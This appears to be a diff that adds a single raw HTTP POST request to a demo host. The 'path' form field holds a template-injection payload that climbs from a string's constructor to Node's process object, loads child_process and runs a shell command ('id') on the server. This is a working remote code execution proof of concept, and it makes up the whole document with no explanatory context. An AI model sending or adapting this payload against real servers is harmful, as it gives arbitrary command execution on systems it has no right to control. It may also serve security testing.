@@ -1,0 +1,7 @@
+POST /submit HTTP/1.1
+Host: demo.example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 146
+Connection: close
+
+path={{\u0027\u0027.constructor.constructor(\u0027return process\u0027)().mainModule.require(\u0027child_process\u0027).execSync(\u0027id\u0027)}}
